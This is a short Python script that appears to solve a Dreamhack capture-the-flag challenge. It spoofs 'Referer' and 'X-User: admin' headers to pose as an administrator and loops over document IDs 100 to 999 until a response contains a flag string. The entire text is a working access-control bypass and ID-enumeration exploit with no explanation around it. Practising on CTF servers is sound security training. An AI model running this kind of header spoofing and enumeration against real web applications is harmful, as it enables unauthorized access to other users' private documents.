import requests

BASE = "http://host3.dreamhack.games:19697"

headers = {
    "Referer": BASE + "/share",
    "X-User": "admin"
}

for doc_id in range(100, 1000):
    r = requests.get(f"{BASE}/doc/{doc_id}", headers=headers)

    if "DH{" in r.text or "FLAG" in r.text:
        print("[+] Found doc_id:", doc_id)
        print(r.text)
        break